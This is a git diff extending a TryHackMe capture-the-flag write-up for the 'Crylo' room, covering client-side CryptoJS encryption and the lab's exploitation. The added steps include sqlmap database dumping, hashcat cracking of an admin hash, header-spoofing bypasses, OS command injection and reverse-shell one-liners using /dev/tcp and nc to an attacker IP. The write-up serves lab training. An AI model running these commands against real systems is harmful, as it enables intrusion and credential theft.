@@ -1,6 +1,8 @@
 # Crylo
 
-Learn about the CryptoJS library and JavaScript-based client-side encryption and decryption.
+> Learn about the CryptoJS library and JavaScript-based client-side encryption and decryption.
+
+This is a writeup for the room [Crylo](https://tryhackme.com/room/crylo4a) on TryHackMe.
 
 <Image src="https://tryhackme-images.s3.amazonaws.com/room-icons/af0e7c2109847033d31d273498657526.png" width="128" />
 
@@ -62,29 +64,150 @@ Using Cyberchef it is possible to convert the response and see its content.
 
 <Image src="/images/writeups/thm/challenges/crylo/decrypt-response.png" />
 
+It is possible to try with sqlmap to see if it is vulnerable to SQL injection.
+
+The easy way to manage the request is to save it in a file and use the `-r` flag.
+
+It seems that using the standard risk level no vulns are found, add `--risk=3 --level=3` to increase it.
+
+```bash
+# Enumerate databases
+sqlmap -r request --risk=3 --level=3 --dbs
+
+# Enumerate tables in food database
+sqlmap -r request --risk=3 --level=3 --tables -D food
+
+# Dump auth data to get the hash of the admin password
+sqlmap -r request --risk=3 --level=3 --dump -T auth_user -D food
+sqlmap -r request --risk=3 --level=3 --dump -T auth_user -D food --data "username=admin" -C password
+```
+
+Follow the default answer for all questions except:
+
+```
+you provided a HTTP Cookie header value. The target URL provided its own cookies within the HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] n
+```
+
+We can obtain a hash of the admin password, we can use hashcat to crack it.
+
+Using a tool hashid we can find the hash type as Django (PBKDF2-SHA256).
+
+```bash
+# Save hash in a file
+echo "pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZAh86qRZtnn0VbWOSmHWhckfVvIsMG+jTZstpE=" > hash.txt
+
+# Get hash type for hashcat
+hashid -m hash.txt
+
+# Crack the hash with mode 10000 (Django (PBKDF2-SHA256))
+hashcat -m 10000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+<Image src="/images/writeups/thm/challenges/crylo/hashcat.png" />
+
 ## Task 3 - Encryption
 
 > Which library is used for encryption and decryption?
 
+Look in `/static/js/validation.js` to find the answer.
+
+The library can be easily recognized by the capitalized name of the variable.
+
+<Image src="/images/writeups/thm/challenges/crylo/encryption.png" />
+
 > Which JSON parameter was used to validate the pin?
 
+Look in `/static/js/validation.js` to find the answer.
+
+There is a specific if statement for the pin parameter.
+
+<Image src="/images/writeups/thm/challenges/crylo/pin-set.png" />
+
 > Which encryption method is used?
+
+Look in `/static/js/validation.js` to find the answer.
+
+At the beginning of the file there is a comment that says that the encryption method is AES.
 
 ## Task 4 - Forbidden Bypass
 
 > What extra header can be used to bypass the page?
 
+Firstly, bypass the login changing the value of `pin_set` to `false`.
+
+```
+{"pin_set": "true", "email": "admin@admin.com", "success": "true"}
+iL6SVLGiiyY47lh6kX353MqD9I+mcSncHWhuJl6Dg7umFTYotHmMKiPaluJ8J35LebkAv3FSyusGIO8rxwJztzwHX9Ot64ltTlbzi/spfQ4=
+
+{"pin_set": "false", "email": "admin@admin.com", "success": "true"}
+HS0kn8CQhTz7NwgLMw9tP1mWXHssgMd2MRJ9EeChrTiPlSg9HGgxyshgHbMYjhFnVbpEi5lm1bRMbgbdebHsfVsN+90GzIuDMX+SBBI9wdY=
+```
+
 > What extra header can be used to bypass the page?
+
+Use the `X-Forwarded-For` header to bypass the IP check.
+
+It can be easily added using Burp Suite.
+
+Be careful to always add the header before sending any request.
+
+```
+X-Forwarded-For: 127.0.0.1
+```
+
+Once the header is added, you will see a simple input text and a submit button.
+
+Send a request and move it to the repeater to simplify the work.
+
+We can check for remote code execution using the following payload.
+
+```bash
+22 && sleep 10
+```
+
+We can see that the command is executed, so we can try to get a reverse shell.
+
+```bash
+ifconfig
+nc -nlvp 1337
+22 && bash -i >& /dev/tcp/[IP]/1337 0>&1
+22 && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.172.114 1337 >/tmp/f
+```
 
 ## Task 5 - Exploitation
 
 > What is the name of the vulnerability used to gain system access?
 
+The vulnerability that we exploited is based on the debug form.
+
+We can send OS commands to be executed on the target server.
+
+[https://portswigger.net/kb/issues/00100100_os-command-injection](https://portswigger.net/kb/issues/00100100_os-command-injection)
+
 > What is the current system’s username?
+
+Once you obtain a reverse shell is enough to run `whoami` to get the answer.
+
+```bash
+whoami
+```
 
 > What is the user flag?
 
+Go to the home directory of the user to find the flag.
+
+```bash
+cd
+cat user.txt
+```
+
 > Which user is part of the sudo group?
+
+It is enough to check the sudo group to find the answer.
+
+```bash
+getent group sudo
+```
 
 > What is the password for the above user?
 
